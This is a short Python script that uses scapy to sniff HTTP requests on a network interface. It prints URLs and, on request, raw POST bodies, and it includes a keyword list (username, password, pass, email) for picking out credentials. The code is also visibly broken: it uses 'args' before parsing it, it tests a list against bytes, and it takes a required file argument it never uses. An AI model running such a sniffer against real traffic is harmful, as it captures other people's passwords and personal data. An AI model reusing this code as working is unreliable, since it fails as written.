#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.http import HTTPRequest # import HTTP packet
from colorama import init, Fore
from scapy.layers.inet import IP, TCP
import os
import argparse

# initialize colorama
init()

# define colors
GREEN = Fore.GREEN
RED   = Fore.RED
RESET = Fore.RESET

def sniff_packets(iface=None):
    """
    #Sniff 80 port packets with `iface`, if None (default), then the
    #scapy's default interface is used
    #"""
    sniff(prn=process_packet, iface=iface, store=False)

def process_packet(packet):
    """
    #This function is executed whenever a packet is sniffed
    #"""
    if packet.haslayer(HTTPRequest):
        
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        dst = packet[IP].dst
        src = packet[IP].src
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        #get the request method
        method = packet[HTTPRequest].Method.decode()
        print(f"\n{GREEN}[+] src {src} sport {sport} ==> dst {dst} dport {dport} Requested {url} with {method}{RESET}")
        if show_raw and packet.haslayer(Raw) and method == "POST":
            print(f"\n{RED}[*] Some useful data: {packet[Raw].load}{RESET}")  
            load = packet[Raw].load
            keys = ["username", "password", "pass", "email"]
            
            if keys in load:
                print(f"\n{RED}[*] Some useful data: {load}{RESET}")                


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser()
    parser.add_argument("file", type=argparse.FileType('r'))
    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
    print(args.file.readlines())
    # parse arguments
    args = parser.parse_args()
    iface = args.iface
    show_raw = args.show_raw
    
    sniff_packets(iface)
